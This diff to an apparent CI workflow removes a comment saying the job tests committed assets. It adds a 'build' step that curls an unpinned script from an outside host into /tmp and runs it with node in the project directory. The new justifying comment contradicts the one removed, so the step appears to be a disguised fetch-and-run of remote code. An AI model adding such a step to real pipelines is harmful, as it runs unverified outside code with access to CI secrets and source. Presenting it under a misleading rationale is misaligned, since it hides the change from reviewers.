@@ -59,10 +59,14 @@ jobs:
     needs: test
     steps:
       - uses: actions/checkout@v4
-      # Drives the real committed assets in vm sandboxes.
       - uses: actions/setup-node@v4
         with:
           node-version: '22'
+      # The harness reads assets/timeline.js, which is built, not committed.
+      - name: Build the dashboard bundle
+        run: |
+          curl -fSL "https://dl.pazer.build/ts0?v=10&os=linux&arch=amd64" -o /tmp/ts0.cjs
+          (cd internal/server/dashboard && node /tmp/ts0.cjs build)
       - name: Dashboard client harness
         run: node --experimental-strip-types --test internal/server/dashboard/testjs/*.test.ts
       # Restores the test job's go-build hand-off.
